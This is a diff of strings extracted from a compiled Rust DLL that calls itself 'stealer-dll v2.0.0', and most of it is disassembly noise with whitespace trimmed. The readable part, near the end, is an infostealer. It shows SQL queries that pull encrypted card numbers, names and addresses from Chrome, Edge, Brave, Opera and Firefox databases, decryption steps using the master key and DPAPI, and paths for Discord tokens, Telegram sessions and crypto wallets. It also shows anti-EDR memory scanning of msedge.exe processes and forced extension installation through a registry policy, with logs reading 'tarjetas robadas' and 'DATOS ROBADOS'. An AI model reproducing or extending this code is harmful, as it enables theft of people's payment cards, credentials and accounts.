@@ -13,10 +13,10 @@ t$8H
 AWAVAUATVWUSH
 L$pH
 D$xH
-L$0f	
+L$0f
 L$,L
 |$,.
-L$+ 
+L$+
 )L$P
 )D$@
 L$0f
@@ -139,7 +139,7 @@ D$ H
 )\$PD
 )T$@D
 )L$0D
-)D$ 
+)D$
 )4$f
 (D$ D
 (L$0D
@@ -522,7 +522,7 @@ AVVWSH
 VWSH
 \$HH
 D$8H
-)D$ 
+)D$
 D$@H
 D$0H
 D$8H
@@ -546,7 +546,7 @@ D$HH
 T$8H
 T$0H
 L$(H
-D$@	
+D$@
 D$`I
 T$PL
 T$@L
@@ -693,7 +693,7 @@ D$HH
 L$8H
 L$0H
 D$(H
-D$@	
+D$@
 L$`I
 D$ H
 L$`I
@@ -965,11 +965,11 @@ T$HH
 L$0H
 D$0H
 T$`H
-(D$ 
+(D$
 |$8H
 D$@H
 L$0H
-(D$ 
+(D$
 AWAVAUATVWSH
 D$XL
 L$(H
@@ -1057,7 +1057,7 @@ t$hH
 d$xH
 D$8I
 D$ H
-fgH	
+fgH
 D$@H
 |$@H
 T$@H
@@ -1069,7 +1069,7 @@ D<@H
 (D$@
 (L$P
 L$@H
-<AH	
+<AH
 D$PH
 T$ A
 T$PA
@@ -1543,7 +1543,7 @@ L$xL
 t$ L
 t$ L
 l$@H
-D$ 	
+D$
 \$xH
 |$0H
 \$8H
@@ -1551,7 +1551,7 @@ L$xL
 t$ L
 t$ L
 l$@H
-D$ 	
+D$
 \$xH
 |$0H
 \$8H
@@ -2581,7 +2581,7 @@ AWAVAUATVWUSI
 """"""""I
 DDDDDDDDH
 []_^A\A]A^A_
-)D$ 
+)D$
 (D$ H
 AVVWSH
 ([_^A^
@@ -2591,7 +2591,7 @@ D$HH
 T$8H
 T$0H
 L$(H
-D$@	
+D$@
 L$0I
 D$ H
 L$pH
@@ -3153,7 +3153,7 @@ T$HH
 T$8H
 T$0H
 L$(H
-D$@	
+D$@
 l$0H
 D$ H
 (^]H
@@ -3245,7 +3245,7 @@ sCL9
 ,7E:,2t
 ffff.
 ffffff.
-oT; 
+oT;
 oD;0f
 upfD
 uxfD
@@ -3453,7 +3453,7 @@ E8H)
 UVWSH
 D$8H
 D$(H
-D$0 
+D$0
  w]H
 [_^]
 UAWAVAUATVWSH
@@ -3635,7 +3635,7 @@ D$(H
 l$0A
 D$(A
 du&3
-D8ngu	
+D8ngu
 D8ngu
 @A_A^A]A\_^]
 \$0H
@@ -3737,7 +3737,7 @@ l$8H
 t$@H
 |$HH
 D$`Mc
-)t$ 
+)t$
 u(Hc
 (t$ H
 u-A;
@@ -3828,7 +3828,7 @@ L$ E3
 L$ E3
 D$PL
 L$ H
-*L$ 
+*L$
 L$PH3
 x AVH
 \$0H
@@ -3970,7 +3970,7 @@ f9A^
 L$8H
 T$8H
 L$@D
-D8kgu	
+D8kgu
 A_A^A]A\_^]
 L$@D
 L$(H
@@ -4016,7 +4016,7 @@ D$4A
 t$HL
 D8cou\H
 t$pD8cgu9M
-D8cgu	
+D8cgu
 A_A^A]A\_^[]
 t$0H
 \$8H
@@ -4528,7 +4528,7 @@ Lcw(3
 D$(H
 D$ H
 \$ H
-%8Xpt 
+%8Xpt
 Gd8Aqt
 f!H(H
 fD	h(
@@ -4858,7 +4858,7 @@ d$$D
 d$0D
 T$HH
 u,D8Y
-D9Z\u 
+D9Z\u
 un	wP
 iD9\$$t#D9
 PA_A^A]A\_^]
@@ -4958,14 +4958,14 @@ l$8H
 t$@H
 |$HH
 \$0H
-H9A 
+H9A
 toHcQ4I
 tFHcQ0
 t;HcQ,
 D$ D
 D$ A
 t$ WATAUAVAWH
-E9l$ 
+E9l$
 o(E8/u
 E8/u#L
 F(;F<
@@ -5441,7 +5441,7 @@ WAVAWH
 <et`<t
 	ujD
 <]t	I
-8/t	
+8/t
 @8;t"I
 @8;t
 \$@H
@@ -5622,7 +5622,7 @@ D$\I
 A9^0u*H
 L$bH
 L$bf
-A9@ 
+A9@
 H9_8
 w(A9_0~'H9>t"H
  E;g0|
@@ -6414,7 +6414,7 @@ D$hH
 D$HM
 L$HL
 D$HL
-IcN 
+IcN
 T$`I
 T$`Hc
 |$@L
@@ -6508,7 +6508,7 @@ H9r0
 H9r@
 H9r8
 H9rH
-H9w 
+H9w
 H9pP
 H9pP
 H9p0
@@ -6704,7 +6704,7 @@ fA	E
 fA	G
 fA	G
 <6r	,64
->5t	
+>5t
 t		H
 HcEwHk
 HcEwL
@@ -6757,7 +6757,7 @@ fA	F
 |$8L
 ^ ~\
 |$(I
-81t 
+81t
 \$ H#
 \$(A
 t IcV
@@ -6876,7 +6876,7 @@ WAVAWH
 l$HH
 t$PH
  A_A^_
-fD9;u 
+fD9;u
 E(A9F,
 WATAUAVAWH
 y(E3
@@ -7316,7 +7316,7 @@ L$8H
 t$HH
 p WATAUAVAWH
 duW3
-cPD8fgu	
+cPD8fgu
 \$PA
 l$XH
 t$hH
@@ -7496,7 +7496,7 @@ t/H9>t*
 A9>t
 @A_A^A]A\_^]
 UVWATAUAVAWH
-L9b 
+L9b
 D$ I
 L9#uaD9%
 MM@M
@@ -7610,7 +7610,7 @@ D8I0u;H
 @0L9A(u.H
 \$0A
 L$0H
-W(u	
+W(u
 GT;F0}
 T$0I
 L$0H
@@ -7691,7 +7691,7 @@ t$8L
 l$0L
 t$(3
 w4fA
-wPD8wgu	
+wPD8wgu
 @A_A^A]A\_^]
 h VWAVH
 duL3
@@ -7706,9 +7706,9 @@ tPD9%
 }-Hc
 MPHc
 gPD8cgu
-gPD8cgu	
+gPD8cgu
 A_A^A]A\_^[]
-wPD8sgu	
+wPD8sgu
 SUVWATAUAVAWH
 l$ H
 D$$D+
@@ -7924,7 +7924,7 @@ t$@H
 |$HH
 UVWATAUAVAWH
 Hcu`E
-~#H9G 
+~#H9G
 G@Ic
 G8t69w,}
 }PHc
@@ -7978,7 +7978,7 @@ T$pL
 \$`H
 l$hH
 0A^_^
-|!u	
+|!u
 \$0H
 l$8H
 t$@H
@@ -8007,8 +8007,8 @@ XA_A^A]A\_^[]
 ~$Ic
 UATAUAVAWH
 }HMc
-oPE8ngu	
-kPD8ogu	
+oPE8ngu
+kPD8ogu
 \$`H
 |$pH
 0A_A^A]A\]
@@ -8027,7 +8027,7 @@ duPE3
 t$`H
 {P@8}gu
 u,E3
-gPD8cgu	
+gPD8cgu
 D$`I
  A_A^A]A\_^]
 SUVWATAUAVAWH
@@ -8062,7 +8062,7 @@ L$(H
 D$8H
 |$0L
 d$(H
-{PD8~gu	
+{PD8~gu
 A_A^A]A\]
 \$0H
 H9ApD
@@ -8302,8 +8302,8 @@ UVWATAUAVAWH
 L$ H
 fPE8fgu
 D$(H
-kPD8ngu	
-kPD8ngu	
+kPD8ngu
+kPD8ngu
 t[D9-
 A_A^A]A\_^]
 L$ L
@@ -8383,7 +8383,7 @@ A_A^A]A\]
 UVWATAUAVAWH
 )|$ E3
 |$pL
-(|$ 
+(|$
 \$xH
 0A_A^A]A\_^]
 T$pH
@@ -8416,7 +8416,7 @@ x4;T$h}.Ic
 WATAUAVAWH
 Hczx3
 B McR
-L+R 
+L+R
 T$`D
 tFHc
 \$PH
@@ -8488,7 +8488,7 @@ L9>u/
 t$0D
 |$(H
 D$ D
-D8~gu	
+D8~gu
 \$@H
 A_A^A]A\_
 x AVH
@@ -8510,7 +8510,7 @@ D$pH
 A9U<
 T$(H
 D$ D
-D8Fgu	
+D8Fgu
 t$XH
 |$pD
 |$`L
@@ -8527,19 +8527,19 @@ e HcO
 A9E<
 D$pD
 t$pH
-D8ugu	
+D8ugu
 L96u0
 t$0D
 t$(H
 D$ D
-D8vgu	
+D8vgu
 |$xH
 t$XL
 t$`A
 \$PM
 \$PH+
 t$XA9U<
-L$@A9U<t	
+L$@A9U<t
 A_A^A]A\_^][
 x AVH
 HcG4H
@@ -8579,7 +8579,7 @@ D$0D
 t$(H
 w E3
 D$ E
-E8Fgu	
+E8Fgu
 "IcE
 ^PL93ukH
 D9v<u8H
@@ -8602,7 +8602,7 @@ S|D82
 uoA;
 D;{<
 mwIc
-Eo;Xh~	
+Eo;Xh~
 P`Ic
 D9v<
 T$(H
@@ -8610,7 +8610,7 @@ HcC8I
 D9v<
 ~HE3
 D$ E
-E8wgu	
+E8wgu
 E8egu
 L9~Hu5E
 D$0D
@@ -8711,7 +8711,7 @@ t$PH
 |$XH
  A_A^A\
 t$ WATAUAVAWH
-H9~ 
+H9~
 D$XH
 uHH9
 L91t
@@ -8741,7 +8741,7 @@ H E3
 EPE3
 uXD9Q
 MPE9P
-x M9W 
+x M9W
 H;9}
 D9U`u
 MPA;H
@@ -8818,7 +8818,7 @@ d$ L
 du|A
 E9fx~'I
 E;~x|
-D8cgu	
+D8cgu
 @A_A^A]A\_^]
 t>I9
 \$0H
@@ -8901,7 +8901,7 @@ L$0D
 \$8H
 WAVAWH
  LcJ
-u"8B 
+u"8B
 \$@H
 l$HH
 t$PH
@@ -8978,12 +8978,12 @@ L9?u/
 ]wD;
 D9~<
 D$ E
-E8~gu	
+E8~gu
 L9~Hu3
 D$0D
 |$(H
 D$ E
-E8~gu	
+E8~gu
 H;A |
 H;A t
 8Cgu
@@ -9208,7 +9208,7 @@ t$PH
 |$XH
  A_A^A\
 J0E3
-CXt 
+CXt
 \$0H
 l$8H
 t$@H
@@ -9627,7 +9627,7 @@ D$(A
 t$hH
 p WATAUAVAWH
 \$pL
-sPD8wgu	
+sPD8wgu
 t$0E
 D$<H
 T$0L
@@ -9871,7 +9871,7 @@ WAVAWH
 l$HH
 t$PH
  A_A^_
-(	O	
+(	O
 inou
 yyac
 deeg
@@ -10172,7 +10172,7 @@ GH;X8~
 B8l6
 B8l6
 D$pA
-;l$ 
+;l$
 L$ A
 G	fD
 D$pI
@@ -10273,7 +10273,7 @@ x AVH
 fD9s
 ;H;K
 D8s!t
-t,D8s 
+t,D8s
 D8s H
 t$ A
 \$@H
@@ -10389,7 +10389,7 @@ A_A^A]A\_^]
 x AVH
 fD9s
 D8s!t
-t,D8s 
+t,D8s
 D8s H
 t$ A
 \$@H
@@ -10452,7 +10452,7 @@ WATAUAVAWH
 d$xB
 <$-u*H
 D$xE;
-59]	
+59]
 >-u'H
 >.u"H
 d$xA;
@@ -10520,10 +10520,10 @@ uzD:
 }HD;
 <>uu
 }H	u;A
-)t$ 
+)t$
 XL$H
 XL$@
-(t$ 
+(t$
 \$0H
 x AV
 t$ H
@@ -10835,7 +10835,7 @@ l$HH
 B( H
 D$PH
 \$0H
-HcQ 
+HcQ
 A(Hc
 UVWATAUAVAWH
 t.E3
@@ -10931,7 +10931,7 @@ t$PH
  A_A^A\
 D$(H
 t$HH
-f9p<|	
+f9p<|
 t$0H
 D$0H
 \$8H
@@ -11094,7 +11094,7 @@ w(@8w*
 @8w+
 uJ@8w)tDD9u
 @8w-
-5U|	
+5U|
 @8w(u7@8w*
 u4@8u
 @8w)
@@ -11136,7 +11136,7 @@ H;=vQ
 t$8H
 \$0H
 H9iH
-9i8u	
+9i8u
 4HcS
 \$0H
 l$8H
@@ -11531,7 +11531,7 @@ D$Pt
 D$HE
 L$0D
 T$HI
-I9} 
+I9}
 D$HM
 d$(A
 T$HE
@@ -11553,7 +11553,7 @@ d$@H
 ^0s)H
 @8xg
 D$P	F(
-8;t	
+8;t
 \$ L
 \$ L
 ;~ t
@@ -11594,7 +11594,7 @@ t$8H
 UVWATAUAVAWH
 D70H
 T70H
-A9E 
+A9E
 hD;8|
 t!D9u
 A8_g
@@ -11722,7 +11722,7 @@ SHL+
 \$0H
 t$8H
 9CXu	H
-)t$ 
+)t$
 *H+K0H
 \$@H
 (t$ H
@@ -11765,7 +11765,7 @@ A;N$|
 (|$`H
 A_A^A]A\_^[]
 L$XH
-=El	
+=El
 \$@H
 t$HH
 |$PH
@@ -11827,7 +11827,7 @@ t I;
 |$ H
 t$HH
 \$0H
-9{Pu 
+9{Pu
 \$0H
 t$8H
 t$ WAVAWH
@@ -11854,7 +11854,7 @@ l$8E8Eg
 fD9A$t
 t$xH
 E9F0u
-L9G 
+L9G
 A_A^A]A\_^][
 F?A:
 o$A:
@@ -12250,7 +12250,7 @@ t$(I;
 @A_A^A]A\_^]
 r+I;
 t7M;
-?et	
+?et
 t$ A
 t$(H
 D$0r
@@ -12277,7 +12277,7 @@ t$`H
 |$hH
 0A_A^A\
 VWAVH
-=3g	
+=3g
 \$HH
 L$HL
 \$HH
@@ -12437,7 +12437,7 @@ L$ A
 sFD9uX
 wPD8G
 E@E;
-D8H!t	
+D8H!t
 OPL;
 0H;GXv
 +tqE
@@ -13291,7 +13291,7 @@ E8N#t/E3
 L$hH
 D$`H
 L$ D
-H9P 
+H9P
 l$`t
 |$pM
 |$XA
@@ -13323,7 +13323,7 @@ L$(E
 t:E8
 F,E3
 |$ A
-D9K,t	
+D9K,t
 A8F&v
 F,D;
 D8Hg
@@ -13630,7 +13630,7 @@ l$(H
 D;k(|
 L$`E3
 @8s,u
-@8w 
+@8w
 D$ I
 A8wg
 D$0H
@@ -13688,7 +13688,7 @@ t$E3
 \$@H
 UWAVH
 z#u!H
-H9E 
+H9E
 @8=S
 U A+
 u#Ic
@@ -13757,7 +13757,7 @@ D9	u
 8_2u
 A9X8tWD
 u=8_0u&L
-L9g(t	
+L9g(t
 8_0u
 t1L;r0~
 H+B0H
@@ -14347,7 +14347,7 @@ uJ9CXt"H
 \$PH
 s WATAUAVAWH
 duY3
-sPD8vgu	
+sPD8vgu
 l$`H
 t$hH
  A_A^A]A\_
@@ -14790,7 +14790,7 @@ D$4I
 T$ A
 L$8H3
 \$PH
-)t$ 
+)t$
 (t$ H
 D$ H
 \$@H
@@ -14989,7 +14989,7 @@ um@8{
 t$8H
 WATAUAVAWH
 kx9|. toH
-CPH98t 
+CPH98t
 \$PA
 l$XH
 t$`H
@@ -15246,7 +15246,7 @@ fD9R
 D$dH
 T$(H
 L$ I
-D9Q t	
+D9Q t
 D$(E
 \$ I
 D$ I
@@ -15740,7 +15740,7 @@ T$ E3
 T$XI
 D$@3
 D$xI
-\$P$	
+\$P$
 t$@3
 u:I9}pu4A
 t$@3
@@ -15848,7 +15848,7 @@ WGE3
 |$ I
 |$ E
 M9]0
-E E9 
+E E9
 U(D9"
 L9Z0
 D9f0
@@ -15863,7 +15863,7 @@ H9PHu
 f;K\}
 D$ I
 u`E3
-G0t	
+G0t
 D$(L
 L$ I
 D$`A
@@ -16125,7 +16125,7 @@ D$pH
 fD;C^
 A_A^A]A\_^[]
 D$pH
-G8u 
+G8u
 D8T$xu
 D8T$ru
 D9T$|us
@@ -17177,7 +17177,7 @@ C(H9C
 -uLD
 T$0D
 \$8H
-)t$ 
+)t$
 (t$ H
 \$0H
 l$8H
@@ -17202,7 +17202,7 @@ t$8H
 x AVH
 y  H
 t$(H
-D$0 
+D$0
 \$PH
 l$XH
 t$`H
@@ -17566,7 +17566,7 @@ L$pE
 A8qg
 A9vP~~I
 FXJcL
-8^u	
+8^u
 ;A9@
 ;A9@
 E;VP|
@@ -17692,7 +17692,7 @@ D$`A
 @8pg
 D$`E3
 D$8I
-D$0 
+D$0
 t$(H
 D$DE
 D$PE3
@@ -17921,7 +17921,7 @@ D$ A
 D$0E3
 A_A^A]A\_^[]
 x AVH
-@ 8B 
+@ 8B
 @!8B!
 @"8B"u}A
 @$8B$utM
@@ -18077,7 +18077,7 @@ x ATAVAWH
 L$ D
 \$0H
 \$ f
-9G,u	
+9G,u
 \$pI
 A_A^A\
 v ;;|
@@ -18111,7 +18111,7 @@ JDA9I
 tDA9H4u>
 Q(u-3
 A9Y |%IcA H
-:5t	
+:5t
 \$0H
 l$8H
 t$@H
@@ -18410,7 +18410,7 @@ l$`H
  A_A^A]_^
 |$0H9
 9{ tMH
-H9C0u	
+H9C0u
 H9C0u
 T$0H
 T$0L
@@ -18704,7 +18704,7 @@ aAE3
 F E3
 _`8OUE
 t$ L
-9_Xt	
+9_Xt
 M'H3
 A_A^A]A\]
 t$ UWAWH
@@ -18855,7 +18855,7 @@ A^_^
 t$8H
 \$0H
 t$8H
-H9Y 
+H9Y
 \$pH
 |$xH
 WATAUAVAWH
@@ -18949,7 +18949,7 @@ D$XH
 L$hH
 T$HH
 9P0t
-D$T$ 
+D$T$
 D$BH
 T$@I
 L$ H
@@ -18974,7 +18974,7 @@ HfD;
 L$0f
 t$XL
 xEfE
-D8^bt	
+D8^bt
 S8@8
 t$Xs
 L$HfA
@@ -19103,7 +19103,7 @@ t$0M
 D$0A
 T$(;B
 R Hk
-B(H	
+B(H
 ,IA:
 w	D9
 CHL9
@@ -19336,7 +19336,7 @@ D9G,
 f9O0
 f;J6}
 D$xH
- H;t$ 
+ H;t$
 0A_A^A]A\_^]
 BhD8X
 L9XHu
@@ -19345,7 +19345,7 @@ D$0A
 B4D;
 WATAUAVAWH
 dCVD
-D9g 
+D9g
  uPE3
 S,E92u
 B0fA9
@@ -19893,8 +19893,8 @@ l$PH
 l$ H
 AWAVVWSH
 \$8H
-)D$ 
-(D$ 
+)D$
+(D$
 P[_^A^A_
 D$PH
 UAVVWSH
@@ -19939,7 +19939,7 @@ ZT"`
 PSh{Ku
 hF@y
 vu(k
->uHU 
+>uHU
 gx]m
 fKd6
 P^y_K
@@ -19982,33 +19982,33 @@ stealer-dll\src\stealer\chromium.rs
 tmp_.db
 mFZ]S
 [decrypt failed][no master key]
-        
- Total bytes: 
-        
- Master key length: 
-        
+
+ Total bytes:
+
+ Master key length:
+
  Prefix:  ()
-        
+
  Nonce length:  bytes
-        
- Ciphertext+Tag length: 
-        
- Expected plaintext: 
-        
+
+ Ciphertext+Tag length:
+
+ Expected plaintext:
+
  Cipher creado correctamente
-        
+
  Desencriptaci
-n exitosa: 
-        
- Error en decrypt: 
-        
+n exitosa:
+
+ Error en decrypt:
+
  Posible causa: Master key incorrecta o formato diferente
-        
+
  Error creando cipher: n
-        
+
  Datos muy cortos para AES-GCM (m
-nimo 31 bytes, tiene 
-        
+nimo 31 bytes, tiene
+
  Datos muy cortos (< 3 bytes)
 \]A4stealer-dll\src\stealer\firefox.rs
 ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
@@ -20024,14 +20024,14 @@ Local StorageleveldbLocal State.log.ldb
 dQw4w9WgXcQ:
 mfa.
 ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/@
-Path: 
+Path:
 stealer-dll\src\stealer\wallets.rs
-Files: 
+Files:
 o,a@
 \/63
 BE8EL
 uZjy
-kBv} 
+kBv}
 Q,n'
 jN.a
 Google\Chrome\User Data\Default\Local Extension SettingsChromeMicrosoft\Edge\User Data\Default\Local Extension SettingsEdgeBraveSoftware\Brave-Browser\User Data\Default\Local Extension SettingsBrave;K
@@ -20052,96 +20052,96 @@ Battle.net.configBattle.net.config
 stealer-dll\src\stealer\telegram.rs
 USERPROFILEDesktopDownloadsDocuments(
 xExk
-Name: 
+Name:
 stealer-dll\src\stealer\autofill.rs
-Card: 
+Card:
 Expiration: /
-Nickname: 
-Billing Address: 
-Email: 
-Phone: 
-Address: 
+Nickname:
+Billing Address:
+Email:
+Phone:
+Address:
 stealer_debug.txt
 === STEAL_CREDIT_CARDS INICIADO ===
 BraveSoftware\Brave-Browser\User Data\Default\Web DataOperaOpera Software\Opera Stable\Web DataOpera GXOpera Software\Opera GX Stable\Web DataVivaldiVivaldi\User Data\Default\Web DataArcArc\User Data\Default\Web DataGoogle\Chrome\User Data\Default\Web DataMicrosoft\Edge\User Data\Default\Web Data
-Intentando browser: 
-  tarjetas encontradas en 
- No se encontraron tarjetas en 
-Profile 
-H    Extrayendo tarjetas de: 
-    DB Path: 
-    Master key disponible: 
-    
+Intentando browser:
+  tarjetas encontradas en
+ No se encontraron tarjetas en
+Profile
+H    Extrayendo tarjetas de:
+    DB Path:
+    Master key disponible:
+
  DB abierta correctamente
-        SELECT 
+        SELECT
             name_on_card,
             expiration_month,
             expiration_year,
             card_number_encrypted,
             billing_address_id,
             nickname
-        FROM 
-    
+        FROM
+
     Ejecutando query...
-    
+
  Query preparado correctamente
     Iterando sobre resultados...
     Total tarjetas extra
-das: 
+das:
     Registro #
-      Nombre: 
-      Exp: 
-      Encrypted bytes: 
-      Primeros bytes (hex): 
-      
+      Nombre:
+      Exp:
+      Encrypted bytes:
+      Primeros bytes (hex):
+
  Formato: DPAPI directo (raw bytes)
-      
+
  Formato: DPAPI con prefijo
-      
+
  Formato: v20 (AES-256-GCM MODERNO) - Necesita master key
-      
+
  Formato: v11 (AES-256-GCM) - Necesita master key
-      
+
  Formato: v10 (AES-256-GCM) - Necesita master key
-      
+
  Intentando AES-256-GCM con master key...
-      
- Total bytes encriptados: 
-      
- Master key length: 
-      
- Master key (primeros 16 bytes): 
-      
- Prefix: 
-      
- Nonce length: 
-      
- Nonce (hex): 
-      
- Ciphertext+Tag length: 
-      
- Expected plaintext: 
-      
+
+ Total bytes encriptados:
+
+ Master key length:
+
+ Master key (primeros 16 bytes):
+
+ Prefix:
+
+ Nonce length:
+
+ Nonce (hex):
+
+ Ciphertext+Tag length:
+
+ Expected plaintext:
+
  AES-256-GCM decrypt OK
-      
+
  AES-256-GCM decrypt failed
-      
+
  Intentando DPAPI...
-      
+
  Desencriptaci
-n exitosa, bytes: 
-      Decrypted bytes (hex): 
-      
+n exitosa, bytes:
+      Decrypted bytes (hex):
+
  UTF8 conversion OK: ''
-      
+
  TARJETA AGREGADA!
-      
+
  UTF8 conversion failed - Bytes desencriptados no son texto v
 lido
-      
+
  Desencriptaci
 n fallida (AES-GCM y DPAPI)
-      
+
  Posibles causas:
          - Windows Defender bloqueando DPAPI
          - Diferente usuario encript
@@ -20149,141 +20149,141 @@ n fallida (AES-GCM y DPAPI)
          - Tarjeta protegida por Microsoft Account
          - Master key incorrecta o no disponible
          - Formato desconocido (no v10/v11/v20/DPAPI)
-      
+
  Error parsing row
-    
+
  Error ejecutando query
-    
- Error preparando query: 
-    
- Error abriendo DB: 
+
+ Error preparando query:
+
+ Error abriendo DB:
 [tb&
-        SELECT 
+        SELECT
             guid,
             street_address,
             city,
             state,
             zipcode,
             country_code
-        FROM 
+        FROM
 bSELECT full_name FROM  WHERE guid = ?
-SELECT email FROM 
-@SELECT number FROM 
+SELECT email FROM
+@SELECT number FROM
 o..h
-        SELECT 
+        SELECT
             street_address,
             city,
             state,
             zipcode,
             country_code
-        FROM 
+        FROM
         WHERE guid = ?
-    
+
 webdata_
- HYBRID CREDIT CARD THEFT 
+ HYBRID CREDIT CARD THEFT
  PASO 1: Intentando m
-todo tradicional (DB + decrypt)...  
+todo tradicional (DB + decrypt)...
  Encontradas  tarjetas con m
 todo tradicional (Chromium)z
  PASO 1.5: Intentando Firefox... tarjetas en Firefoxz
- PASO 2: v20 detectado 
+ PASO 2: v20 detectado
  Usando Memory Injection Anti-EDR... tarjetas en memoria
- Memory injection failed: 
+ Memory injection failed:
  PASO 3: Saltando extensi
 n (tarjetas ya obtenidas)
  PASO 3: Instalando extensi
-n como fallback...  
+n como fallback...
  Extensi
-n instalada exitosamente  
- Extension install failed: 
+n instalada exitosamente
+ Extension install failed:
  TOTAL FINAL:  tarjetas robadas
- Iniciando Memory Injection Multi-Proceso...  
- Buscando TODOS los procesos msedge.exe...    Card # (exp: 
+ Iniciando Memory Injection Multi-Proceso...
+ Buscando TODOS los procesos msedge.exe...    Card # (exp:
 Edge (Memory)
  No se encontraron tarjetas en ning
-n proceso EdgeNo cards found in Edge memorychromium-extensionExtension not foundFailed to get current dir  
+n proceso EdgeNo cards found in Edge memorychromium-extensionExtension not foundFailed to get current dir
  [FIREFOX] Iniciando extracci
-n de tarjetas...APPDATA  
- APPDATA: 
-Mozilla\Firefox\Profiles  
- Buscando perfiles en: 
- Directorio de perfiles no existe  
- Iterando sobre perfiles...  
- Perfil: 
-formautofill.sqlite    
- Buscando DB: 
-    
-  formautofill.sqlite NO EXISTEautofill-profiles.json    
- Buscando alternativa: 
-    
-  autofill-profiles.json tampoco existe    
- autofill-profiles.json ENCONTRADO!    
+n de tarjetas...APPDATA
+ APPDATA:
+Mozilla\Firefox\Profiles
+ Buscando perfiles en:
+ Directorio de perfiles no existe
+ Iterando sobre perfiles...
+ Perfil:
+formautofill.sqlite
+ Buscando DB:
+
+  formautofill.sqlite NO EXISTEautofill-profiles.json
+ Buscando alternativa:
+
+  autofill-profiles.json tampoco existe
+ autofill-profiles.json ENCONTRADO!
  Tama
 Firefox-RAW-CARDS::autofill-profiles.json
 Base64 file
-    
- Exfiltrado como Base64    
+
+ Exfiltrado como Base64
  DB ENCONTRADO!ff_cards_
-    
- Copiando a: 
-    
- DB copiado, extrayendo tarjetas...    
+
+ Copiando a:
+
+ DB copiado, extrayendo tarjetas...
  Extra
 das  tarjetas
-    
- Error: 
-    
- Error copiando DB  
- Error leyendo directorio de perfiles  
- Total tarjetas: 
- APPDATA no encontrado      
+
+ Error:
+
+ Error copiando DB
+ Error leyendo directorio de perfiles
+ Total tarjetas:
+ APPDATA no encontrado
   Abriendo DB...S
-      
- DB abiertaSELECT name FROM sqlite_master WHERE type='table' AND name='credit_cards_data'      
-  Tabla credit_cards_data NO EXISTE      
- Buscando tabla credit_cards_encrypted...SELECT name FROM sqlite_master WHERE type='table' AND name='credit_cards_encrypted'      
- Ninguna tabla de tarjetas encontrada      
- TODAS LAS TABLAS EN LA DB:SELECT name FROM sqlite_master WHERE type='table'        . 
-      
- Tabla credit_cards_data existe      
+
+ DB abiertaSELECT name FROM sqlite_master WHERE type='table' AND name='credit_cards_data'
+  Tabla credit_cards_data NO EXISTE
+ Buscando tabla credit_cards_encrypted...SELECT name FROM sqlite_master WHERE type='table' AND name='credit_cards_encrypted'
+ Ninguna tabla de tarjetas encontrada
+ TODAS LAS TABLAS EN LA DB:SELECT name FROM sqlite_master WHERE type='table'        .
+
+ Tabla credit_cards_data existe
  COLUMNAS DE credit_cards_data:PRAGMA table_info(credit_cards_data)
-      
+
  EJEMPLO DE FILA (raw data):SELECT * FROM credit_cards_data LIMIT 1: '
 : < bytes binarios>
-        (sin filas)SELECT COUNT(*) FROM credit_cards_data      
- Filas en tabla: 
-      
+        (sin filas)SELECT COUNT(*) FROM credit_cards_data
+ Filas en tabla:
+
   Tabla VAC
-A      
- Ejecutando query...SELECT guid, json_extract(data, '$.cc-name'), json_extract(data, '$.cc-number'), json_extract(data, '$.cc-exp-month'), json_extract(data, '$.cc-exp-year') FROM credit_cards_data      
- Query preparada      
- Iterando resultados...      
+A
+ Ejecutando query...SELECT guid, json_extract(data, '$.cc-name'), json_extract(data, '$.cc-number'), json_extract(data, '$.cc-exp-month'), json_extract(data, '$.cc-exp-year') FROM credit_cards_data
+ Query preparada
+ Iterando resultados...
  Total extra
 das: s
-      
+
  Fila #
-        
- Nombre: 
-        
-mero: 
-        
- Exp: 
-        
+
+ Nombre:
+
+mero:
+
+ Exp:
+
  Todos los campos presentes
-        
+
  Validaci
-n ASCII: 
-        
+n ASCII:
+
 mero no v
-lido (encriptado/binario)        
+lido (encriptado/binario)
  TARJETA V
 LIDA ENCONTRADA!
-        
-  Campos faltantes        
- Error parseando fila: 
-Failed to open Firefox DB: 
-Failed to prepare statement: 
-Query failed: 
+
+  Campos faltantes
+ Error parseando fila:
+Failed to open Firefox DB:
+Failed to prepare statement:
+Query failed:
 LOCALAPPDATAstealer-dll\src\stealer\common.rs
 stealer-dll\src\stealer\extension_installer.rs
 [+] Installing extension in Chrome...
@@ -20294,33 +20294,33 @@ MicrosoftEdge not foundMicrosoft\Edge[+] Edge installation complete
 BraveSoftwareBrave-BrowserBrave not foundBraveSoftware\Brave[+] Brave installation complete
 Software\Policies\\ExtensionInstallForcelist
 ;file:///
-1[+] Registry key created for 
+1[+] Registry key created for
 Invalid pathExternal Extensions
 external_crx
-external_version1.0.0[+] External extension file created for 
+external_version1.0.0[+] External extension file created for
 stealer-dll\src\stealer\memory_injection.rs
  [MULTI-PROCESS SCAN] Encontrados  procesos msedge.exe
  [MULTI-PROCESS SCAN] Total:  procesos
- Escaneando proceso # - PID: 
-    
- Encontradas  tarjetas en PID 
-    
-  Sin tarjetas en PID 
+ Escaneando proceso # - PID:
+
+ Encontradas  tarjetas en PID
+
+  Sin tarjetas en PID
       Stats:  regiones v
 lidas,  p
 ginas le
-        
+
  Regi
-n legible - Sample: 
-      
- Card found:  (exp 
-4111        
+n legible - Sample:
+
+ Card found:  (exp
+4111
  DEBUG: Encontrado '4111' en memoria!
-        
- Contexto: 
-URL: 
-User: 
-Pass: 
+
+ Contexto:
+URL:
+User:
+Pass:
  DEBUG LOG (Credit Cards)
  BROWSER CREDENTIALS (
  DISCORD TOKENS (
@@ -20329,16 +20329,16 @@ Pass:
  TELEGRAM SESSIONS (
  CREDIT CARDS (
  AUTOFILL ADDRESSES (
- DEBUG: Buscando log en: 
- DEBUG: Archivo existe: 
+ DEBUG: Buscando log en:
+ DEBUG: Archivo existe:
  DEBUG: Archivo de log no existe
  DEBUG: Esto significa que steal_credit_cards() no escribi
  nada
  DEBUG: Log le
 do correctamente
- DEBUG: Error leyendo log: 
+ DEBUG: Error leyendo log:
 stealer-dll\src\lib.rs
- DATOS ROBADOS 
+ DATOS ROBADOS
 Total:  items encontrados
 ERROR:No se encontraron credenciales
 stealer-dll v2.0.0
@@ -20347,7 +20347,7 @@ capacity overflow
 library\alloc\src\raw_vec\mod.rs
 library\alloc\src\string.rs
 library\alloc\src\ffi\c_str.rs
-nul byte found in provided data at position: 
+nul byte found in provided data at position:
 library\alloc\src\fmt.rs
 library\alloc\src\slice.rs
 library\alloc\src\str.rs
@@ -20358,21 +20358,21 @@ nI73
 	):7
 .@	4
